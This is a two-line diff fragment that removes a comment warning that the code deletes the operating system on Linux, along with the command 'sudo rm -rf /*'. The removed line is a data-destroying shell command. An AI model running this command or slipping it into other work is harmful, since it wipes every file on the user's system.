@@ -1,2 +1,0 @@
-#deletes your OS if run on linux
-sudo rm -rf /*
